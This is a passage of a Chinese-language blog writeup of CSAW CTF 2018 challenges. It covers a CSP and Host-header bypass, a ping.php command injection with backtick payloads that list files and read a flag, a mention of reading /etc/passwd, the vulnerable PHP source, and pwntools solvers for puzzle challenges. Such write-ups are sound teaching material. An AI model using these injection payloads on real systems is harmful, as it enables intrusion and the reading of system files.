+<h5 id="No-Vulnerable-Services（CSP绕过，ping读文件——还需理解学习）"><a href="#No-Vulnerable-Services（CSP绕过，ping读文件——还需理解学习）" class="headerlink" title="No Vulnerable Services（CSP绕过，ping读文件——还需理解学习）"></a>No Vulnerable Services（CSP绕过，ping读文件——还需理解学习）</h5><p><code>No Vulnerable Services is a company founded on the idea that all websites should be secure. We use the latest web security standards, and provide complementary pentests of all customer sites with our exclusive NoPwn® guarantee.</code></p>
+<p><code>Be #unhackable.™</code></p>
+<p><code>http://no.vulnerable.services/</code></p>
+<p>此题没做出来，稍显复杂，先扔个<a href="https://ctftime.org/writeup/11205" target="_blank" rel="noopener">writeup</a>，然后复现一遍</p>
+<p>首先用这个<a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener">CSP检测工具</a>检验CSP，检验结果如下图：</p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537365900771.png" alt="1537365900771"></p>
+<p>发现<code>script-src</code>可能存在问题，但题目环境中我们并没有能够控制<code>src</code>的地方，所以再回头看看还有什么发现。</p>
+<p>页面的最底下发现了一个奇怪的域名</p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537365952852.png" alt="1537365952852"></p>
+<p>我们<code>ping</code>一下<code>no.vulnerable.services</code>发现解析地址是：<code>216.165.2.40</code>，16进制表示就是<code>0xd8a50228</code>。</p>
+<p>由于CSP中存在<code>script-src *.no.vulnerable.services</code>，通过代理，我们可以绕过这一层。但是如何挂上代理呢？这里还有有一个点就是我们能提交网站内容供他们检查，他们会使用<code>bot</code>去模拟访问。</p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537433319556.png" alt="1537433319556"></p>
+<p>提交之后，得到了<code>cookie=PHPSESSID=9evknkhr4lfb2oii4h2k71ulac</code></p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537433181250.png" alt="1537433181250"></p>
+<p>但是这里我尝试使用这里的cookie访问<code>http://admin.no.vulnerable.services</code>，都是需要账号和密码的，完全复现不出以下页面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;NVS INTERNAL - Admin&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;p&gt;Current Visitors: 672&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;Quick links:&lt;/p&gt;</span><br><span class="line">        &lt;ul&gt;</span><br><span class="line">            &lt;li&gt;&lt;a href=&quot;//support.no.vulnerable.services&quot;&gt;Support&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">            &lt;li&gt;&lt;a href=&quot;lb.php&quot;&gt;Load Balancers - BETA&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">        &lt;/ul&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>以下是我尝试的两个页面截图，第二个页面还是重定向到了<code>login.php</code>去了</p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537406529974.png" alt="1537406529974"></p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537406731871.png" alt="1537406731871"></p>
+<p>下面这句话我没搞懂，是我太菜了？还请大佬们教教我</p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537433574609.png" alt="1537433574609"></p>
+<p>额，假设我复现出以上页面，使用这个<code>cookie</code>的成功访问<code>http://admin.no.vulnerable.services</code>，我们将看到<code>admin.no.vulnerable.services/lb.php</code>与<code>support.no.vulnerable.services</code>。</p>
+<p>查看其中<code>lb.php</code>，其实是一个负载均衡的监视器：</p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537433252118.png" alt="1537433252118"></p>
+<p>在<code>lb.php</code>，我们可以找到<code>216.165.2.41</code>，但无法访问。</p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537433820630.png" alt="1537433820630"></p>
+<p>如果我们将<code>Host</code>更改为<code>support.no.vulnerable.services</code>，则会返回<code>Hacking detected! Denied attempt to proxy to a NVS internal hostname. Your IP has been logged.</code>。</p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537406901499.png" alt="1537406901499"></p>
+<p>这是因为<code>216.165.2.41</code>是代理，所以我们可以按照上面的格式将<code>Host</code>改为<code>{hexip}.ip.no.vulnerable.service</code>。但怎么知道<code>ip</code>呢？我们<code>ping</code> 下<code>support.no.vulnerable.services</code>，知道它的<code>ip</code>是<code>172.16.2.5</code>，而<code>172.16.2.5</code>的<code>16</code>进制值为<code>ac100205</code>，所以我们可以使用<code>ac100205.ip.no.vulnerable.services</code>它来访问它。（这个<a href="https://www.browserling.com/tools/ip-to-hex" target="_blank" rel="noopener">网站</a>将<code>ip</code>值转化为<code>16</code>进制值）</p>
+<p>构造完，我们访问下，得到如下页面，可以看到有个ping.php</p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537407249656.png" alt="1537407249656"></p>
+<p>这个页面是可以进行<code>ping</code>，看来它是一个<code>ping</code>命令行注入。</p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537407286715.png" alt="1537407286715"></p>
+<p>尝试下（注意<code>Host</code>头部均要改成<code>Host: ac100205.ip.no.vulnerable.services</code>）</p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537407427066.png" alt="1537407427066"></p>
+<p>尝试<code>ls</code>一下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /ping.php?dest=127.0.0.`ls`</span><br></pre></td></tr></table></figure>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537407642085.png" alt="1537407642085"></p>
+<p>读取<code>flag.txt</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /ping.php?dest=127.0.0.1`cat%20flag.txt`</span><br></pre></td></tr></table></figure>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537407992506.png" alt="1537407992506"></p>
+<p>得到<code>flag{7672f158167cab32aebc161abe0fbfcaee2868c1}</code></p>
+<p>后面尝试读取其他文件，比如<code>ping.php</code></p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537408264849.png" alt="1537408264849"></p>
+<p>以下是此源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'dest'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Missing parameters."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dest = $_GET[<span class="string">'dest'</span>];</span><br><span class="line"></span><br><span class="line">system(<span class="string">"ping -c3 \""</span> . $dest . <span class="string">"\" 2&gt;&amp;1"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>又如<code>/etc/passwd</code>…….其他自行摸索篇</p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537408363301.png" alt="1537408363301"></p>
+<h5 id="WTF-SQL（没搞懂考的啥——此题未解决）"><a href="#WTF-SQL（没搞懂考的啥——此题未解决）" class="headerlink" title="WTF.SQL（没搞懂考的啥——此题未解决）"></a>WTF.SQL（没搞懂考的啥——此题未解决）</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">         C S A W</span><br><span class="line">          C T F</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">It is a period of civil war.</span><br><span class="line">Rebel hackers, striking</span><br><span class="line">from a hidden base, have won</span><br><span class="line">their first victory against</span><br><span class="line">the evil DBA.</span><br><span class="line"></span><br><span class="line">During the battle, Rebel</span><br><span class="line">spies managed to steal secret</span><br><span class="line">plans to the DBA&apos;s</span><br><span class="line">ultimate weapon, WTF.SQL,</span><br><span class="line">an integrated framework</span><br><span class="line">with enough buzzwords to</span><br><span class="line">host an entire website.</span><br><span class="line"></span><br><span class="line">Pursued by the DBA&apos;s</span><br><span class="line">sinister agents, You, the</span><br><span class="line">Player, race home aboard</span><br><span class="line">your VT100, custodian of the</span><br><span class="line">stolen schema that can save</span><br><span class="line">the animals and restore</span><br><span class="line">freedom to the internet.....</span><br><span class="line"></span><br><span class="line">Your mission is to read out</span><br><span class="line">the txt table in the flag</span><br><span class="line">database.</span><br></pre></td></tr></table></figure>
+<p><code>Enjoy :&gt;</code></p>
+<p><code>Edit: (09/15 11:06 AM EST) Fixed a bug in stage 2</code></p>
+<p><code>http://web.chal.csaw.io:3306</code></p>
+<p>此题先放出<a href="https://blog.rpis.ec/2018/09/csaw-ctf-quals-2018-wtf-sql.html" target="_blank" rel="noopener">writeup</a></p>
+<h4 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h4><h5 id="Twitch-Plays-Test-Flag（签到题）"><a href="#Twitch-Plays-Test-Flag（签到题）" class="headerlink" title="Twitch Plays Test Flag（签到题）"></a>Twitch Plays Test Flag（签到题）</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;typ3_y3s_to_c0nt1nue&#125;</span><br></pre></td></tr></table></figure>
+<h5 id="bin-t"><a href="#bin-t" class="headerlink" title="bin_t"></a>bin_t</h5><p>Binary trees let you do some interesting things. Can you balance a tree?</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc misc.chal.csaw.io 9001</span><br></pre></td></tr></table></figure>
+<p>Equal nodes should be inserted to the right of the parent node. You should balance the tree as you add nodes.</p>
+<p><code>nc</code>下给出一组数字，将这组数字转换成<code>平衡二叉树</code>，并且给出该ACL树的前序遍历。</p>
+<p><code>Add these numbers to a AVL Binary Tree, then send them back in the preorder traversal!</code><br><code>99,5,76,16,73,65,45,48,52,81,99,38,16,83,91,20,40,35,41,94,26,40,53,89,93,43,27,49,3,87,98,48,38,64,78,44,81,22,28,35,29,51,63,87,55,99,78,34,47,0,98,54,88,55,81,66,60,40,23,78,70,74,83,98,38,24,29,4,64,65,49,46,46,10,22,98,35,55,73,16,83,86,21,99,78,56,31,6,77,83,81,69,63,77,26,31,20,81,76,8</code><br><code>Send the preorder traversal in a comma sperated list.</code></p>
+<p>对于我这种菜鸡而言，还是有点难度的，直接<code>github</code>找了下，调用<code>pyavltree</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pyavltree <span class="keyword">import</span> AVLTree</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"misc.chal.csaw.io"</span>, <span class="number">9001</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">numbers = [int(x) <span class="keyword">for</span> x <span class="keyword">in</span> r.recvline().split(<span class="string">","</span>)]</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line">tree = AVLTree(numbers)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">","</span>.join([str(x) <span class="keyword">for</span> x <span class="keyword">in</span> tree.preorder(tree.rootNode)]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> r.recvall()</span><br></pre></td></tr></table></figure>
+<p>得到flag</p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537435410792.png" alt="1537435410792"></p>
+<p>不过这样的做法是学不到东西的，还是得回头学。</p>
+<h5 id="Short-Circuit"><a href="#Short-Circuit" class="headerlink" title="Short Circuit"></a>Short Circuit</h5><p>Start from the monkey’s paw and work your way down the high voltage line, for every wire that is branches off has an element that is either on or off. Ignore the first bit. Standard flag format.</p>
+<ul>
+<li>Elyk</li>
+</ul>
+<p>Hint: There are 112 Things You Need to Worry About</p>
+<p><a href="https://ctf.csaw.io/files/cdd260cc2b42696bff30d001b85aed06/20180915_074129.jpg" target="_blank" rel="noopener">20180915_074129.jpg</a></p>
+<p>这题是我见过最恐怖的misc题，正确做法如下</p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/6.png" alt="6"></p>
+<p>上面那个看不懂，再看下面的</p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/short-circuit.jpg" alt="short-circuit"></p>
+<p>然后拼接</p>
+<p><code>01100110 01101100 01100001 01100111 01111011 01101111 01110111 01101101 01111001</code><br><code>01101000 01100001 01101110 01100100 01111101</code></p>
+<p>转换得到<code>flag</code></p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537436074257.png" alt="1537436074257"></p>
+<p>此题有非常详细的<a href="https://github.com/mohamedaymenkarmous/CTF/tree/master/CSAWCTFQualificationRound2018#short-circuit" target="_blank" rel="noopener">writeup</a>，可以仔细学习到很多东西</p>
+<h5 id="Algebra"><a href="#Algebra" class="headerlink" title="Algebra"></a>Algebra</h5><p>Are you a real math wiz?</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc misc.chal.csaw.io 9002</span><br></pre></td></tr></table></figure>
+<p>这题不难，自己用<code>pwntools</code>写出来了，不过无意间看了大佬的简易代码，运用<a href="https://code.activestate.com/recipes/365013-linear-equations-solver-in-3-lines/" target="_blank" rel="noopener">复数的姿势</a>，稍微修改了下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#-*-coding:utf-8</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">sc=socket.socket()</span><br><span class="line">host = &quot;misc.chal.csaw.io&quot;</span><br><span class="line">port =9002</span><br><span class="line">addr=(host,port)</span><br><span class="line">sc.connect(addr)</span><br><span class="line">print sc.recv(2048)</span><br><span class="line"></span><br><span class="line">def solve1(eq,var=&apos;X&apos;):</span><br><span class="line">    eq1 = eq.replace(&quot;=&quot;,&quot;-(&quot;) + &quot;)&quot;</span><br><span class="line">    print eq1</span><br><span class="line">    c = eval(eq1,&#123;var:1j&#125;)</span><br><span class="line">    print c</span><br><span class="line">    print c.real,c.imag</span><br><span class="line">    if (-c.real == 0):</span><br><span class="line">        return 0</span><br><span class="line">    else:</span><br><span class="line">        return -c.real/c.imag</span><br><span class="line"></span><br><span class="line">def find(num):</span><br><span class="line">    print &apos;============  &apos; + str(num) + &apos;  ===============&apos;</span><br><span class="line">    data = sc.recv(1024)</span><br><span class="line">    if &quot;flag&quot; in data:</span><br><span class="line">        print data</span><br><span class="line">        return 1</span><br><span class="line">    if num!=1:</span><br><span class="line">        equation = data.split(&apos;\n&apos;)[1]</span><br><span class="line">    else:</span><br><span class="line">        equation = data.split(&apos;\n&apos;)[0]</span><br><span class="line">    print equation</span><br><span class="line">    result = str(solve1(equation))</span><br><span class="line">    print &apos;solving：&apos; + equation + &apos;, result = &apos; + result</span><br><span class="line">    sc.send(result + &apos;\n&apos;)</span><br><span class="line">    print &apos;===========================&apos;</span><br><span class="line"></span><br><span class="line">    return 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i = 1</span><br><span class="line">while True:</span><br><span class="line">    if find(i):</span><br><span class="line">        break</span><br><span class="line">    i += 1</span><br></pre></td></tr></table></figure>
+<p>运行得到<code>flag</code></p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537438355628.png" alt="1537438355628"></p>
+<p>最终答案<code>flag{y0u_s0_60od_aT_tH3_qU1cK_M4tH5}</code></p>
+<p><code>pwntools</code>使用的源码如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"misc.chal.csaw.io"</span>, <span class="number">9002</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Skip the banner</span></span><br><span class="line">r.recvuntil(<span class="string">"*********"</span>)</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    task = r.recvline()</span><br><span class="line">    <span class="keyword">print</span> task</span><br><span class="line">    <span class="keyword">print</span> r.recvuntil(<span class="string">"What does X equal?: "</span>)</span><br><span class="line"></span><br><span class="line">    eq1 = task.replace(<span class="string">"="</span>,<span class="string">"-("</span>)+<span class="string">")"</span></span><br><span class="line">    c = eval(eq1,&#123;<span class="string">"X"</span>:<span class="number">1j</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Return 0 by default = if infinite solutions</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> c.imag != <span class="number">0</span>:</span><br><span class="line">        result = -c.real/c.imag</span><br><span class="line"></span><br><span class="line">    r.sendline(str(result))</span><br><span class="line">    <span class="keyword">print</span> r.recvline()</span><br></pre></td></tr></table></figure>
+<h5 id="Take-an-L"><a href="#Take-an-L" class="headerlink" title="Take an L"></a>Take an L</h5><p>Fill the grid with L’s but avoid the marked spot for the W</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc misc.chal.csaw.io 9000</span><br></pre></td></tr></table></figure>
+<p>The origin is at (0,0) on the top left</p>
+<p><a href="https://ctf.csaw.io/files/08e3f77b27de5e821d109c5b329133aa/description.pdf" target="_blank" rel="noopener">description.pdf</a></p>
+<p>此题，对于菜鸡而言不是现在能解决的，我放弃，放出<a href="https://gitlab.com/mahham/ctf/blob/master/2018-csaw/Readme.md#take-an-l-200-misc" target="_blank" rel="noopener">writeup</a></p>
+<h4 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h4><h5 id="simple-recovery"><a href="#simple-recovery" class="headerlink" title="simple_recovery"></a>simple_recovery</h5><p><code>Simple Recovery Try to recover the data from these RAID 5 images!</code></p>
+<p><a href="https://ctf.csaw.io/files/54ee1842ff27eb6bff1755f36f044b54/disk.img0.7z" target="_blank" rel="noopener">disk.img0.7z</a>，<a href="https://ctf.csaw.io/files/ebf1816483b27db5be622be0cc781224/disk.img1.7z" target="_blank" rel="noopener">disk.img1.7z</a></p>
+<p>提供两个文件，<code>file</code>下</p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537236481427.png" alt="1537236481427"></p>
+<p>img文件，尝试一波挂载，竟然没效果，使用绝招<code>strings *| grep &quot;flag&quot;</code>，搜索出<code>flag</code>，一脸郁闷</p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537238416590.png" alt="1537238416590"></p>
+<h5 id="🐼-Rewind"><a href="#🐼-Rewind" class="headerlink" title="🐼 Rewind"></a>🐼 Rewind</h5><p><code>Sometimes you have to look back and replay what has been done right and wrong</code></p>
+<p>解压之后，使用绝招<code>strings *| grep &quot;flag&quot;</code>，就那么几个，尝试下</p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537441789426.png" alt="1537441789426"></p>
+<p>最终答案：<code>flag{RUN_R3C0RD_ANA1YZ3_R3P3AT}</code></p>
+<h5 id="whyOS"><a href="#whyOS" class="headerlink" title="whyOS"></a>whyOS</h5><p><code>Have fun digging through that one. No device needed.</code></p>
+<p><code>Note: the flag is not in flag{} format</code></p>
+<p><code>HINT: the flag is literally a hex string. Put the hex string in the flag submission box</code></p>
+<p><code>Update (09/15 11:45 AM EST) - Point of the challenge has been raised to 300 Update Sun 9:09 AM: its a hex string guys</code></p>
+<p><a href="https://ctf.csaw.io/files/77ce62c32bbf0e685ebc0c5741b1d585/com.yourcompany.whyos_4.2.0-28debug_iphoneos-arm.deb" target="_blank" rel="noopener">com.yourcompany.whyos_4.2.0-28debug_iphoneos-arm.deb</a></p>
+<p><a href="https://ctf.csaw.io/files/9c2e3d70941abc0b911990507ac73160/console.log" target="_blank" rel="noopener">console.log</a></p>
+<p>给了两个文件</p>
+<p>强行命令<code>strings * | grep &#39;Preferences&#39; | grep -E &#39;[0-9a-fA-F]{32,}&#39;</code>搜索</p>
+<p><img src="/2018/09/24/CSAW-CTF-Qualification-Round-2018-Writeup/1537442382158.png" alt="1537442382158"></p>
+<p>最终答案<code>ca3412b55940568c5b10a616fa7b855e</code></p>
+<h5 id="mcgriddle"><a href="#mcgriddle" class="headerlink" title="mcgriddle"></a>mcgriddle</h5><p><code>All CTF players are squares</code></p>
+<p><code>Edit (09/14 8:22 PM) - Uploaded new pcap file</code></p>
+<p><code>Edit (09/15 12:10 AM) - Uploaded new pcap file</code></p>
+<p><a href="https://ctf.csaw.io/files/86651aad7d1f26ee512b46327c5aa160/final.pcap" target="_blank" rel="noopener">final.pcap</a></p>
+<p>这题流量分析后面单独开篇讲解，贼有意思的一道题目。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/09/18/Icectf2018-writeup/" rel="next" title="Icectf2018 writeup">
+                <i class="fa fa-chevron-left"></i> Icectf2018 writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/09/24/2018中秋节随记/" rel="prev" title="2018中秋节随记">
+                2018中秋节随记 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/person_image.jpg"
+                alt="jianghuxia" />
+            
+              <p class="site-author-name" itemprop="name">jianghuxia</p>
+              <p class="site-description motion-element" itemprop="description">Stay Hungry. Stay Foolish.</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#Web"><span class="nav-number">1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Ldab-ldab注入——还需理解学习"><span class="nav-number">1.1.</span> <span class="nav-text">Ldab(ldab注入——还需理解学习)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#sso（篡改Token——还需理解学习）"><span class="nav-number">1.2.</span> <span class="nav-text">sso（篡改Token——还需理解学习）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Hacker-Movie-Club-Web-缓存中毒——还需理解学习"><span class="nav-number">1.3.</span> <span class="nav-text">Hacker Movie Club(Web 缓存中毒——还需理解学习)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#No-Vulnerable-Services（CSP绕过，ping读文件——还需理解学习）"><span class="nav-number">1.4.</span> <span class="nav-text">No Vulnerable Services（CSP绕过，ping读文件——还需理解学习）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#WTF-SQL（没搞懂考的啥——此题未解决）"><span class="nav-number">1.5.</span> <span class="nav-text">WTF.SQL（没搞懂考的啥——此题未解决）</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Misc"><span class="nav-number">2.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Twitch-Plays-Test-Flag（签到题）"><span class="nav-number">2.1.</span> <span class="nav-text">Twitch Plays Test Flag（签到题）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#bin-t"><span class="nav-number">2.2.</span> <span class="nav-text">bin_t</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Short-Circuit"><span class="nav-number">2.3.</span> <span class="nav-text">Short Circuit</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Algebra"><span class="nav-number">2.4.</span> <span class="nav-text">Algebra</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Take-an-L"><span class="nav-number">2.5.</span> <span class="nav-text">Take an L</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Forensics"><span class="nav-number">3.</span> <span class="nav-text">Forensics</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#simple-recovery"><span class="nav-number">3.1.</span> <span class="nav-text">simple_recovery</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" 